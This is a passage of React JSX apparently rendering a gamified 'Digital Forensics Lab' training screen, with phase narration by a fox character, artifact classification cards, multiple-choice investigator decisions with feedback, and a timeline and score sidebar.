      <div style={{ background:"rgba(0,0,0,0.6)", borderBottom:"1px solid rgba(251,191,36,0.12)", padding:"10px 20px", display:"flex", alignItems:"center", gap:12, position:"sticky", top:0, zIndex:100, backdropFilter:"blur(8px)" }}>
        <button onClick={() => onHome ? onHome() : router.push("/soc")}
          style={{ background:"rgba(255,255,255,0.06)", border:"1px solid rgba(255,255,255,0.12)", borderRadius:6, color:"rgba(255,255,255,0.5)", fontSize:11, padding:"4px 10px", cursor:"pointer" }}>
          ← SOC
        </button>
        <div style={{ flex:1 }}>
          <div style={{ display:"flex", alignItems:"center", gap:8 }}>
            <span style={{ fontSize:18 }}>🦊</span>
            <span style={{ fontFamily:"'Cinzel',serif", fontSize:13, fontWeight:700, color:"#f5ede0" }}>Digital Forensics Lab</span>
            <span style={{ fontSize:10, color:"rgba(251,191,36,0.6)", padding:"2px 8px", borderRadius:10, border:"1px solid rgba(251,191,36,0.2)", fontFamily:"'JetBrains Mono',monospace" }}>CASE #2026-0514</span>
          </div>
        </div>
        <div style={{ display:"flex", alignItems:"center", gap:12 }}>
          <button onClick={() => setShowBoard(!showBoard)}
            style={{ background:showBoard?"rgba(251,191,36,0.12)":"rgba(255,255,255,0.06)", border:`1px solid ${showBoard?"rgba(251,191,36,0.4)":"rgba(255,255,255,0.12)"}`, borderRadius:6, color:showBoard?"#fbbf24":"rgba(255,255,255,0.5)", fontSize:11, padding:"4px 12px", cursor:"pointer" }}>
            📋 Timeline
          </button>
          <div style={{ fontFamily:"'JetBrains Mono',monospace", fontSize:11, color:"#fbbf24" }}>
            {score} pts
          </div>
          <div style={{ display:"flex", gap:3 }}>
            {PHASES.map((_, i) => (
              <div key={i} style={{ width:24, height:4, borderRadius:2, background: i < phaseIdx ? "#fbbf24" : i === phaseIdx ? "rgba(251,191,36,0.5)" : "rgba(255,255,255,0.1)" }}/>
            ))}
          </div>
        </div>
      </div>

      <div style={{ maxWidth:960, margin:"0 auto", padding:"1.5rem", display:"grid", gridTemplateColumns: showBoard ? "1fr 320px" : "1fr", gap:"1.5rem", alignItems:"start" }}>

        {/* Main content */}
        <div ref={scrollRef}>
          {/* Phase header */}
          <div style={{ background:"linear-gradient(135deg,rgba(251,191,36,0.06),rgba(251,191,36,0.02))", borderRadius:14, padding:"1.4rem", border:"1px solid rgba(251,191,36,0.15)", marginBottom:"1.5rem" }}>
            <div style={{ fontSize:9, letterSpacing:"0.3em", color:"rgba(251,191,36,0.5)", marginBottom:8, fontFamily:"'JetBrains Mono',monospace" }}>
              PHASE {phaseIdx + 1} OF {PHASES.length}
            </div>
            <h2 style={{ fontFamily:"'Cinzel',serif", fontSize:"1.3rem", fontWeight:700, color:"#f5ede0", margin:"0 0 4px" }}>{phase.title}</h2>
            <div style={{ fontSize:12, color:"rgba(255,255,255,0.45)", marginBottom:14 }}>{phase.subtitle}</div>

            {/* Tha'lab narration */}
            <div style={{ display:"flex", gap:12, alignItems:"flex-start" }}>
              <div style={{ width:36, height:36, borderRadius:"50%", background:"rgba(251,191,36,0.1)", border:"1.5px solid rgba(251,191,36,0.3)", display:"flex", alignItems:"center", justifyContent:"center", fontSize:18, flexShrink:0 }}>🦊</div>
              <div style={{ background:"rgba(0,0,0,0.25)", borderRadius:"4px 12px 12px 12px", padding:"10px 14px", flex:1 }}>
                <div style={{ fontSize:9, color:"rgba(251,191,36,0.6)", fontWeight:700, letterSpacing:"0.15em", marginBottom:5, fontFamily:"'JetBrains Mono',monospace" }}>THA'LAB</div>
                <div style={{ fontSize:13, color:"rgba(255,255,255,0.8)", lineHeight:1.7 }}>{phase.thalab}</div>
              </div>
            </div>
          </div>

          {/* Artifacts */}
          <div style={{ marginBottom:"1.5rem" }}>
            <div style={{ fontSize:10, letterSpacing:"0.2em", color:"rgba(255,255,255,0.35)", marginBottom:10, fontFamily:"'JetBrains Mono',monospace" }}>
              EVIDENCE — CLASSIFY EACH ARTIFACT
            </div>
            <div style={{ display:"flex", flexDirection:"column", gap:8 }}>
              {phase.artifacts.map(artifact => (
                <ArtifactCard
                  key={artifact.id}
                  artifact={artifact}
                  classified={classifications[artifact.id] ?? null}
                  onClassify={sig => handleClassify(artifact.id, sig)}
                />
              ))}
            </div>
          </div>

          {/* Decision — unlocks after all artifacts classified */}
          {allClassified && (
            <div style={{ background:"rgba(99,102,241,0.06)", borderRadius:14, padding:"1.4rem", border:"1px solid rgba(99,102,241,0.2)", marginBottom:"1.5rem" }}>
              <div style={{ fontSize:10, letterSpacing:"0.2em", color:"rgba(99,102,241,0.7)", marginBottom:10, fontFamily:"'JetBrains Mono',monospace" }}>
                INVESTIGATOR'S DECISION
              </div>
              <div style={{ fontSize:14, color:"rgba(255,255,255,0.9)", fontWeight:600, marginBottom:12, lineHeight:1.5 }}>{phase.decision.q}</div>
              <div style={{ display:"flex", flexDirection:"column", gap:8 }}>
                {phase.decision.opts.map((opt, i) => {
                  const isChosen = decision === i;
                  const showFeedback = showResult;
                  let bg = "rgba(255,255,255,0.04)";
                  let border = "rgba(255,255,255,0.1)";
                  let color = "rgba(255,255,255,0.75)";
                  if (showFeedback && opt.correct)    { bg="rgba(22,163,74,0.1)";  border="rgba(22,163,74,0.4)";  color="#4ade80"; }
                  if (showFeedback && isChosen && !opt.correct) { bg="rgba(220,38,38,0.08)"; border="rgba(220,38,38,0.35)"; color="#f87171"; }

                  return (
                    <div key={i} onClick={() => handleDecision(i)}
                      style={{ padding:"12px 16px", borderRadius:9, border:`1.5px solid ${border}`, background:bg, color, cursor:decision===null?"pointer":"default", transition:"all .15s", lineHeight:1.6, fontSize:13 }}>
                      {opt.text}
                      {showFeedback && (isChosen || opt.correct) && (
                        <div style={{ fontSize:11, marginTop:8, opacity:0.8, borderTop:`1px solid ${border}`, paddingTop:8, lineHeight:1.7 }}>
                          {opt.correct ? "✓ " : "✗ "}{opt.consequence}
                        </div>
                      )}
                    </div>
                  );
                })}
              </div>

              {showResult && (
                <div style={{ textAlign:"center", marginTop:14 }}>
                  <button onClick={handleNextPhase}
                    style={{ padding:"10px 28px", borderRadius:8, border:"none", background:"rgba(251,191,36,0.12)", color:"#fbbf24", fontSize:11, fontWeight:700, cursor:"pointer", letterSpacing:"0.15em", fontFamily:"'JetBrains Mono',monospace" }}>
                    {phaseIdx + 1 >= PHASES.length ? "Complete Investigation →" : `Phase ${phaseIdx + 2}: ${PHASES[phaseIdx + 1].title.split("—")[1]?.trim()} →`}
                  </button>
                </div>
              )}
            </div>
          )}

          {!allClassified && (
            <div style={{ textAlign:"center", padding:"1rem", fontSize:11, color:"rgba(255,255,255,0.25)", fontFamily:"'JetBrains Mono',monospace", letterSpacing:"0.1em" }}>
              ↑ CLASSIFY ALL {phase.artifacts.length} ARTIFACTS TO UNLOCK THE DECISION
            </div>
          )}
        </div>

        {/* Evidence board sidebar */}
        {showBoard && (
          <div style={{ position:"sticky", top:"60px" }}>
            <EvidenceBoard entries={timeline} />
            <div style={{ marginTop:12, background:"rgba(0,0,0,0.25)", borderRadius:10, padding:"12px 14px", border:"1px solid rgba(255,255,255,0.07)" }}>
              <div style={{ fontSize:9, letterSpacing:"0.2em", color:"rgba(255,255,255,0.3)", marginBottom:8, fontFamily:"'JetBrains Mono',monospace" }}>SCORE BREAKDOWN</div>
              <div style={{ fontSize:11, color:"rgba(255,255,255,0.5)", lineHeight:1.9 }}>
                <div>Artifact classification: {Object.keys(classifications).length} done</div>
                <div>Phase decisions: {phaseIdx} / {PHASES.length}</div>
                <div style={{ color:"#fbbf24", marginTop:4 }}>Total: {score} pts</div>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
